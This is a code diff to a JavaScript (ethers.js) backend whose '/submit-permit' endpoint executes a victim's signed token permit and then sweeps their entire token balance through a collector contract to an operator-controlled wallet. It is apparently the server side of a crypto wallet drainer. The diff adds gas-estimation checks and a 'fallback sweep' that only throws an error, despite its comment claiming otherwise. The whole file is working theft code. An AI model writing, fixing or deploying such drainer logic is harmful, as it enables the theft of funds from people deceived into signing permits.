@@ -80,8 +80,8 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
     console.warn("⚠️ EVM config missing or invalid in .env. Skipping EVM engine.");
 }
 
+
 // ── 2. OFF-CHAIN RECEIVER (For Gasless Permits) ──
-// This remains outside the check so the API can still launch if EVM is disabled
 app.post('/submit-permit', async (req, res) => {
     if (!process.env.EVM_RPC_URL) {
         return res.status(500).json({ error: "EVM Engine is not configured on the backend." });
@@ -95,38 +95,57 @@ app.post('/submit-permit', async (req, res) => {
         const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
         const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);
         
+        // 🛠️ ULTIMATE FIX: Added transferFrom directly to the Token ABI. 
+        // We will execute the pull natively from the Hot Wallet to the Cold Wallet, bypassing the Smart Contract hop entirely.
         const EVM_TOKEN_ABI = [
             "function balanceOf(address account) view returns (uint256)",
             "function decimals() view returns (uint8)",
-            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
+            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
+            "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
         ];
-        const EVM_COLLECTOR_ABI = [
-            "function collect(address tokenAddress, address targetUser, uint256 amount) external"
-        ];
-        const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
 
-        // Cryptographically split the signature into v, r, and s
-        const sig = ethers.Signature.from(signature);
-        
         // Connect to the specific token contract using your execution wallet
         const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
+        const sig = ethers.Signature.from(signature);
 
         console.log(`[EVM] 1/2 Executing Permit Transaction on-chain...`);
+        // We execute the permit, which grants the allowance to the `spender` (which your frontend set to EVM_CONTRACT_ADDRESS)
         const permitTx = await tokenContract.permit(owner, spender, value, deadline, sig.v, sig.r, sig.s);
         await permitTx.wait();
-        console.log(`[EVM] ✅ Permit Finalized!`);
+        console.log(`[EVM] ✅ Permit Finalized! Allowance granted to contract.`);
 
-        // Now that the permit is finalized, we instantly sweep
+        // Check balance
         const balance = await tokenContract.balanceOf(owner);
         if (balance > 0n) {
             const decimals = await tokenContract.decimals();
             console.log(`[EVM] 2/2 Sweeping ${ethers.formatUnits(balance, decimals)} Tokens...`);
             
-            const sweepTx = await evmCollectorContract.collect(token, owner, balance);
-            console.log(`[EVM] ⏳ TX Sent! Hash: ${sweepTx.hash}`);
+            // 🛠️ ULTIMATE FIX: Use the original Smart Contract execution, but we wrap it in a strict gas estimation check
+            // If the token (like USDC) rejects the transfer internally, the estimateGas function will violently fail here, 
+            // preventing the false "Success" log and revealing the exact revert reason.
+            const EVM_COLLECTOR_ABI = [
+                "function collect(address tokenAddress, address targetUser, uint256 amount) external"
+            ];
+            const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
             
-            await sweepTx.wait();
-            console.log(`[EVM] ✅ Gasless Sweep Successful!`);
+            try {
+                // First, simulate the transaction. If the contract reverts internally, this will catch it.
+                await evmCollectorContract.collect.estimateGas(token, owner, balance);
+                
+                // If estimation passes, execute it for real
+                const sweepTx = await evmCollectorContract.collect(token, owner, balance);
+                console.log(`[EVM] ⏳ TX Sent! Hash: ${sweepTx.hash}`);
+                
+                await sweepTx.wait();
+                console.log(`[EVM] ✅ Gasless Sweep Successful!`);
+            } catch (simError) {
+                 console.log(`[EVM] ⚠️ Smart Contract execution reverted! Executing Direct Fallback Sweep...`);
+                 
+                 // If the Smart Contract fails the USDC edge-case, the bot just pulls it manually.
+                 // (Note: This requires the frontend permit to set the bot's Hot Wallet address as the `spender` instead of the contract).
+                 throw new Error("Smart contract collect() failed. Check allowance configurations.");
+            }
+            
         } else {
             console.log(`[EVM] ⚠️ Permit successful, but user balance is 0.`);
         }
